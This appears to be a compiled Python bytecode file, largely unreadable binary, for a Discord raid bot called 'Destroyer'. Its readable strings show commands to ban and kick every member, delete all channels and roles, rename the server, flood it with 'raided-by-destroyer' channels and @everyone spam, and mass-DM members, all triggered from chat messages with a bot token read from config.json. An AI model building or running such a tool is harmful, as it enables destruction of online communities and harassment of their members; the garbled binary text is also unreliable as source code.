U
    β
«^H/  γ                	   @   s2  d dl Z d dlZd dlZd dlZd dlZd dlZd dlZd dlmZ d dlmZ d dl	m
Z
 d dlmZmZ G dd dZejj dej d	‘ ed
Ze e‘ZW 5 Q R X e d‘Ze d‘Ze  ‘ ZejdedZe d‘ e ‘  dd Zej dd Z!ej dd Z"dd Z#dd Z$dd Z%e%  dS )ι    N)Ϊpath)ΪFore)ΪProcess)ΪcommandsΪtasksc                   @   s   e Zd ZdZdS )Ϊ	DESTROYERι   N)Ϊ__name__Ϊ
__module__Ϊ__qualname__Ϊversion© r   r   ϊee.pyr      s   r   ϊDestroyer vz | Loading...zconfig.jsonΪtokenΪprefixΪ	Destroyer)ZdescriptionZcommand_prefixΪhelpc                +   C   sΐ   t tj dtj dtj dtj dt dtj dtj dtj dtj dtj tj	j
 d	tj	j dtj d
tj tj	j dtj dtj dtj dtj dtj dtj dt d*tj  d S )Nuh  
    βββββββ ββββββ   ββββββ βββββββββ ββββββ   ββββββ βββ   βββββββββ  ββββββ  
    ββββ βββββ   β βββ    β β  βββ βββββ β βββββββ  ββββββ  βββββ   β βββ β βββ
    βββ   ββββββ   β ββββ   β ββββ βββββ βββ βββββ  βββ βββ βββββββ   βββ βββ β
    ββββ   ββββ  β   β   ββββ ββββ β βββββββ  βββ   βββ β ββββββββ  β βββββββ  
    βββββββ ββββββββββββββββ  ββββ β ββββ βββββ βββββββ β ββββββββββββββββ ββββ
    βββ  β ββ ββ ββ βββ β β  β ββ   β ββ βββββ ββββββ   βββββ ββ ββ ββ ββ ββββ
    β β  β  β β  ββ ββ  β β    β      ββ β ββ  β β ββ βββ βββ  β β  β  ββ β ββ
    β β  β    β   β  β  β    β        ββ   β β β β β  β β ββ     β     ββ   β 
    β       β  β      β              β         β β  β β        β  β   β     
    β                                                 β β                         
                    
                        
    z$[INFORMATION] z	 Prefix: ϊ z
    z Destroyer vz | z Logged in as ϊ#z | ID: z$[CREDITS] z: Destroyer was coded by https://youtube.com/snipcola.
    z
$[SYSTEM] z! The bot is now operational.
    ϊ Do z#help to view all the commands.
    )Ϊprintr   ΪRESETΪREDΪGREENr   r   r   r   ΪuserΪnameZdiscriminatorΪidZBLUEr   r   r   r   Ϊstart_print$   s>    
σσσσςσςςσςρσσσξr   c                   Γ   s0   t   t  tjj dtj dtj	j
 ‘ d S )Nr   z | Logged in as )ΪClearr   ΪctypesΪwindllΪkernel32ΪSetConsoleTitleWr   r   r   r   r   r   r   r   r   Ϊ
on_connect;   s
    ?r$   c              :   Γ   s:  | j  t d‘rltdtj dtj dtj  |  d‘I d H  t 	d‘I d H  |  
‘ I d H  t  t  | j  t d‘rtdtj dtj t dtj d	tj dtj t dtj d
tj dtj t dtj dtj dtj t dtj dtj dtj t dtj dtj dtj t dtj dtj dtj t dtj dtj dtj t dtj d9 |  d‘I d H  t 	d‘I d H  |  
‘ I d H  | j  t d‘r|  d‘I d H  t 	d‘I d H  |  
‘ I d H  | jjD ]}zR|jddI d H  tdtj dtj d|j d| jj d	 t 	d‘I d H  W n8   tdtj dtj d|j d| jj d	 Y nX qβtdtj dtj d | j  t d‘r|  d‘I d H  t 	d‘I d H  |  
‘ I d H  | jjD ]}zR|jd dI d H  tdtj d!tj d"|j d| jj d	 t 	d‘I d H  W n8   tdtj d!tj d#|j d| jj d	 Y nX qΪtdtj d!tj d$ | j  t d‘rώtdtj d%tj d& tdtj d%tj d't d( d)atrntd)krΪt| I d H  qΪnp| j  t d‘rnd*a|  d‘I d H  t 	d‘I d H  |  
‘ I d H  t 	d‘I d H  tdtj d%tj d+ | j  t d‘rͺtdtj d,tj d-| jj d. |  d‘I d H  t 	d‘I d H  |  
‘ I d H  t ‘ D ]@}| 
‘ I d H  tdtj d,tj d/|j d0| jj d	 qάtdtj d,tj d1 | jjD ]~}z>| 
‘ I d H  tdtj d,tj d2|j d0| jj d	 W n8   tdtj d,tj d3|j d0| jj d	 Y nX q@tdtj d,tj d4 | jjD ]}zR|jddI d H  tdtj d,tj d|j d| jj d	 t 	d‘I d H  W n8   tdtj d,tj d|j d| jj d	 Y nX qβtdtj d,tj d tdtj d,tj d5 | j  t d‘r6| j  t d6d7‘}|t dksΐtdtj d8tj d9| jj d |  d‘I d H  t 	d‘I d H  |  
‘ I d H  | jjD ]}z@| |‘I d H  tdtj d8tj d:|j d0| jj d	 W n8   tdtj d8tj d;|j d0| jj d	 Y nX q<nRtdtj d8tj d<| jj d |  d=‘I d H  t 	d‘I d H  |  
‘ I d H  tdtj d8tj d>| jj d d S )?NΪclsϊ    z$[CLEAR CONSOLE] z"Clearing console in 1.5 seconds...υ   βη      ψ?r   z$[HELP] z3 (This shows all the commands in the console.)
    z- (This clears all lines in the console.)
    zban allz- (This bans every member in the server.)
    zkick allz. (This kicks every member in the server.)
    Zdestroyz! (This destroys the server.)
    Zsdestroyz2 (This stops the destroy command, if active.)
    Znukez@ (This deletes everything in the server and bans everyone.)
    zdm allz4 (This DM/PMs everyone in the server your message.)
zBanned by Destroyer.)Ϊreasonz$[BAN ALL] z Banned z from Ϊ.gΉ?z Failed banning z* The bot has successfully banned everyone.zKicked by Destroyer.z$[KICK ALL] z Kicked z Failed kicking z* The bot has successfully kicked everyone.ϊ$[DESTROY] z' Server destruction has been initiated.r   z sdestroy to stop this command...TFz% Server destruction has been stopped.z$[NUKE] z Nuking z in 1.5 seconds...z Deleted channel ϊ in z/ The bot has successfully deleted all channels.z Deleted role z Failed deleting role z, The bot has successfully deleted all roles.z" The nuke command is now finished.zdm all Ϊ z
$[DM ALL] z DMing everyone in the guild ϊ DMed ϊ Failed DMing z$ Failed DMing everyone in the guild u   βz& Finished DMing everyone in the guild )ZcontentΪ
startswithr   r   r   ΪCYANr   Ϊadd_reactionΪasyncioΪsleepΪdeleter   r   r   ΪguildΪmembersZbanr   r   ZkickΪdloopΪDestroyr   Zget_all_channelsZrolesΪreplaceΪsend)ΪmessageΪmemberΪchannelZroleΪmsgr   r   r   Ϊ
on_messageC   sΒ    ?δ?
,6,6 
$006,6$08$r@   c                 Γ   sj  |   d‘I d H  t d‘I d H  |  ‘ I d H  d}d}tdkrbd}zBtdtj dtj d| j	j
 d	| d
	 | j	jddI d H  W n6   tdtj dtj d| j	j
 d	| d
	 Y nX | j	jD ]}tdkrΖzT| d|j d| j	j
 d
‘I d H  tdtj dtj d|j
 d| j	j
 d
	 W qΖ   tdtj dtj d|j
 d| j	j
 d
	 Y qΖX qΖtrftdkrbz\tdkrΜ|d7 }| j	 dt| ‘I d H }tdtj dtj d|j
 d| j	j
 d
	 W n:   tdkrtdtj dtj d| j	j
 d
 Y nX tjj| j	jdt| d}| d‘I d H  tdtj dtj d|j
 d| j	j
 d
	 qbd S )Nr'   r(   r   TZ	DESTROYEDr&   r+   z Changed server name from z to r*   )r   z Failed changing server name z<@!z<>, ONE OF THE SERVERS YOU ARE IN IS GETTING RAIDED. SERVER: r.   r,   r/   r   zraided-by-destroyer-z Created a z channel in z5 The maximum number of channels have been reached in z3@everyone THIS SERVER HAS BEEN RAIDED BY DESTROYER.z Sent message in channel z, guild )r2   r3   r4   r5   r8   r   r   r1   r   r6   r   Zeditr   r7   r;   r   Zcreate_text_channelΪstrΪdiscordZutilsΪgetZchannels)r<   ZcnumberZrnumberZ	guildnamer=   r>   r   r   r   r9   Ή   s@    
*0$04

0
*r9   c                   C   s   t  d‘ d S )Nr%   )ΪosΪsystemr   r   r   r   r   ά   s    r   c                  C   sΐ   t  d‘dkrDt  tdtj dtj dtj dtj  t  nxt  d‘} z&tj	| ddd t
 d	tj ‘ W nF tjjk
rΊ   tdtj dtj d
tj dtj  t  Y nX d S )Nr   z
token-herer&   z$[SYSTEM ERROR] zCWhoops! It looks like you didn't put a token in config.json. 

    z $[SYSTEM] Press any key to exit.T)ZbotZ	reconnectztitle Destroyer - Version z8Sorry but, the token in config.json is incorrect. 

    )ΪconfigrC   r   r   r   r   r   Ϊinputr   ΪrunrD   rE   r   r   rB   ΪerrorsZLoginFailure)r   r   r   r   ΪInitΰ   s*    ώ?

?ώ?rJ   )&rB   r3   ZrandomZcoloramar    rD   Zjsonr   r   Zmultiprocessingr   Zdiscord.extr   r   r   r!   r"   r#   r   ΪopenΪfΪloadrF   rC   r   r   ZClientr   ZBotZremove_commandZinitr   Zeventr$   r@   r9   r   rJ   r   r   r   r   Ϊ<module>   sD   ?


ώ


u#